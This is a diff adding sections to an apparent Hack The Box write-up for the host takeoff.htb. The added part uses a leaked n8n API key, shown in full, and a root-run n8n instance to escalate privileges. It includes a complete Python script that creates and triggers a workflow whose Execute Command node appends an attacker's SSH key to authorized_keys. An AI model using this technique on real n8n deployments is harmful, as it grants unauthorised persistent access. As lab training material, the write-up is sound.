@@ -109,6 +109,9 @@ N8N_API_KEY=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIwNzU4NzZmZS05ZDVjLTR
 
 
 
+<img width="1074" height="210" alt="image" src="https://github.com/user-attachments/assets/1173e72f-9f59-4d1f-bcf4-870f00f3df7a" />
+
+
 ---
 
 ## Extract the QR image from the PDF
@@ -227,25 +230,149 @@ python3 exploit.py
 <img width="973" height="166" alt="image" src="https://github.com/user-attachments/assets/8022481d-2138-4d70-b95b-85f62a79a08d" />
 
 
+## we found **`N8N_API_KEY`** before so let's Find the n8n process
+
+```
+ps aux | grep n8n
+```
+
+<img width="1743" height="162" alt="image" src="https://github.com/user-attachments/assets/99fba16c-94da-48f8-8b82-fdb585449460" />
+
+
+1. **The user is `root`**: The n8n process is running as the root user.
+    
+2. **The command is `node /usr/local/bin/n8n`**: n8n is a Node.js application.
+    
+3. **The task runner** (`node --disallow-code-generation... @n8n/task-runner`) is also running as root, which means it's ready to execute workflow nodes (like the Execute Command node) with root privileges.
+
+
+---
+
+> I inspected the systemd service file for the application using `systemctl cat htb-air`. The file showed that the main web application ran as the unprivileged `www-data` user. However, it also revealed the `N8N_API_KEY` environment variable and a dependency on `docker.service`. This indicated that the n8n instance was running separately from the web app.
+
+> I was checked running processes with `ps aux | grep n8n` and confirmed that the n8n process was running as `root`. Because the n8n application runs as root and allows the execution of arbitrary commands via workflows, the leaked API key could be used to escalate privileges from `www-data` to root.
+
+```
+systemctl cat htb-air
+```
+
+<img width="1385" height="485" alt="image" src="https://github.com/user-attachments/assets/7a1ff0c7-2ca2-4501-b9fb-8584f7948a02" />
+
+
+---
+
+
+## exploit n8n
+
+
+```python
+
+curl -s -X POST http://127.0.0.1:5678/api/v1/workflows \
+  -H "X-N8N-API-KEY: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIwNzU4NzZmZS05ZDVjLTRlYzMtOWZmZS1lMTE1OWJiNzkwZWEiLCJpc3MiOiJuOG4iLCJhdWQiOiJwdWJsaWMtYXBpIiwianRpIjoiYTRhZjI4MDQtNjlhYS00NzRkLWEyMTYtMDk5ZTRmZWJkZGJmIiwiaWF0IjoxNzg4MTk1NzEzfQ.RwDUTt7IRDTD9xjc944ioBnth2fupQtsimazdzLzAOo" \
+  -H "Content-Type: application/json" \
+  -d '{"name":"raw_json_probe","nodes":[],"connections":{},"settings":{}}'
+
+```
+
+<img width="1781" height="163" alt="image" src="https://github.com/user-attachments/assets/c8e6d78a-f5a1-4ec6-a927-9fcf23138c5c" />
+
+
+```
+"project": {
+    "name": "Keith Park <kpark@takeoff.htb>",
+    "id": "8uop0aEowj4YUSmN",
+    "type": "personal",
+    "creatorId": "075876fe-9d5c-4ec3-9ffe-e1159bb790ea"
+}
+```
+
+
+> To confirm the identity of the n8n instance owner, I submitted a `POST` request to the `/api/v1/workflows` endpoint with a minimal dummy JSON payload. The API responded with `HTTP 201 Created` and returned the full object of the newly created workflow. Within the `"shared"` metadata, the API leaked the `"project"` object, revealing the owner's name (`Keith Park <kpark@takeoff.htb>`) and creator ID. This confirmed the host user `kpark` was tied to the n8n container.
 
 
 
+----
+
+## Generate the SSH Key Pair
+
+```
+ssh-keygen -t ed25519 -f kpark_key -N ""
+```
+
+## Create the n8n API Script that writes our key to the mounted directory.
+
+```python
+import requests
+
+API_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
+TARGET = "http://127.0.0.1:5678/api/v1"
+PUBKEY = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJnfNguQrrWOKb0jaqJutZ3RMNtXRDIce6bvthLAHfoF kali@kali"
+
+HEADERS = {
+    "X-N8N-API-KEY": API_KEY,
+    "Content-Type": "application/json"
+}
+
+# The command writes the key to /root/.ssh/ and fixes permissions
+command = f"mkdir -p /root/.ssh && echo '{PUBKEY}' >> /root/.ssh/authorized_keys && chmod 700 /root/.ssh && chmod 600 /root/.ssh/authorized_keys && chown -R 1001:1001 /root/.ssh"
+
+wf = {
+    "name": "ssh_inject",
+    "nodes": [
+        {
+            "parameters": {"httpMethod": "GET", "path": "sshinject", "responseMode": "responseNode"},
+            "id": "webhook-1", "name": "Webhook", "type": "n8n-nodes-base.webhook",
+            "typeVersion": 2, "position": [240, 300], "webhookId": "ssh-uuid-001"
+        },
+        {
+            "parameters": {"command": command},
+            "id": "exec-1", "name": "Execute Command", "type": "n8n-nodes-base.executeCommand",
+            "typeVersion": 1, "position": [460, 300]
+        },
+        {
+            "parameters": {}, "id": "respond-1", "name": "Respond to Webhook",
+            "type": "n8n-nodes-base.respondToWebhook", "typeVersion": 1, "position": [680, 300]
+        }
+    ],
+    "connections": {
+        "Webhook": {"main": [[{"node": "Execute Command", "type": "main", "index": 0}]]},
+        "Execute Command": {"main": [[{"node": "Respond to Webhook", "type": "main", "index": 0}]]}
+    },
+    "settings": {"executionOrder": "v1"}
+}
+
+print("[*] Creating workflow...")
+r = requests.post(f"{TARGET}/workflows", json=wf, headers=HEADERS)
+wf_id = r.json()["id"]
+
+print(f"[*] Activating workflow {wf_id}...")
+requests.post(f"{TARGET}/workflows/{wf_id}/activate", headers=HEADERS)
+
+print("[*] Triggering webhook...")
+try:
+    requests.get("http://127.0.0.1:5678/webhook/sshinject", timeout=3)
+except Exception:
+    pass
+
+print("[*] Done. Try SSHing in as kpark.")
+```
 
 
 
+```
+python3 ssh_exploit.py
+```
 
 
+---
 
+## SSH as kpark
 
+```
+ssh -i kpark_key kpark@takeoff.htb
+```
 
-
-
-
-
-
-
-
-
+<img width="1452" height="378" alt="image" src="https://github.com/user-attachments/assets/8a51fb52-f910-49e5-a4b9-b400f4a5e5af" />
 
 
 
